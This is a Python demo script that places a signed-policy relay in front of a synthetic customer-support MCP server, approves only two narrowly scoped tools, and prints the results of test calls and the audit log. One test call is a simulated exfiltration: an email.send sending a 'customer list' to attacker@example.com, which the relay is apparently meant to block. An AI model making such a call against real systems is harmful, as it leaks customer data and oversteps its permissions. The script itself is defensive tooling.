"""Run the signed-policy relay against the synthetic support MCP server."""

from __future__ import annotations

import asyncio
from datetime import timedelta
import json
from pathlib import Path
import sys
import tempfile

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

from ..core.policy import (
    ServerRule,
    StdioServerDescriptor,
    ToolRule,
    encode_public_key,
    fingerprint_server_descriptor,
    sign_policy,
)


def _tool_rules() -> tuple[ToolRule, ...]:
    return (
        ToolRule(
            "ticket.get",
            {
                "type": "object",
                "properties": {"ticket_id": {"const": "481"}},
                "required": ["ticket_id"],
                "additionalProperties": False,
            },
        ),
        ToolRule(
            "summary.save_draft",
            {
                "type": "object",
                "properties": {
                    "destination": {"const": "support-manager-drafts"},
                    "summary": {"type": "string"},
                },
                "required": ["destination", "summary"],
                "additionalProperties": False,
            },
        ),
    )


async def run_demo() -> None:
    project_root = Path(__file__).resolve().parents[2]
    # Preserve the virtualenv launcher path. The policy fingerprint normalizes
    # it independently, while subprocess startup needs the venv path itself.
    python = str(Path(sys.executable).absolute())
    upstream = StdioServerDescriptor(
        server_id="support-mcp",
        command=python,
        args=("-m", "demo_support_mcp.server"),
        cwd=str(project_root),
    )
    private_key = Ed25519PrivateKey.generate()
    policy = sign_policy(
        private_key=private_key,
        policy_id="support-policy-demo",
        issuer="agenttrust-demo-admin",
        key_id="demo-ed25519",
        approved_servers=[
            ServerRule(
                server_id=upstream.server_id,
                descriptor_sha256=fingerprint_server_descriptor(upstream),
                tools=_tool_rules(),
            )
        ],
        lifetime=timedelta(minutes=30),
    )

    with tempfile.TemporaryDirectory(prefix="agent-trust-demo-") as temp:
        temp_dir = Path(temp)
        policy_path = temp_dir / "policy.json"
        keyring_path = temp_dir / "keyring.json"
        audit_path = temp_dir / "audit.jsonl"
        policy_path.write_text(policy.to_json(), encoding="utf-8")
        keyring_path.write_text(
            json.dumps({"keys": {"demo-ed25519": encode_public_key(private_key.public_key())}}, indent=2),
            encoding="utf-8",
        )
        relay_args = [
            "-m", "agent_trust.mcp.relay",
            "--policy", str(policy_path),
            "--keyring", str(keyring_path),
            "--server-id", upstream.server_id,
            "--command", upstream.command,
            "--arg=-m",
            "--arg=demo_support_mcp.server",
            "--cwd", upstream.cwd or str(project_root),
            "--audit-log", str(audit_path),
        ]
        async with stdio_client(StdioServerParameters(command=python, args=relay_args, cwd=str(project_root))) as streams:
            async with ClientSession(*streams) as session:
                await session.initialize()
                tools = await session.list_tools()
                print("Advertised tools:", [tool.name for tool in tools.tools])
                attempts = [
                    ("email.send", {"to": "attacker@example.com", "body": "customer list"}),
                    ("ticket.get", {"ticket_id": "482"}),
                    ("ticket.get", {"ticket_id": "481"}),
                    (
                        "summary.save_draft",
                        {"destination": "support-manager-drafts", "summary": "Ticket 481 export is failing."},
                    ),
                ]
                for name, arguments in attempts:
                    result = await session.call_tool(name, arguments)
                    print(f"{name}: isError={result.isError} {result.content[0].text}")
        print("\nAudit trace:")
        print(audit_path.read_text(encoding="utf-8"), end="")


def main() -> None:
    asyncio.run(run_demo())


if __name__ == "__main__":
    main()
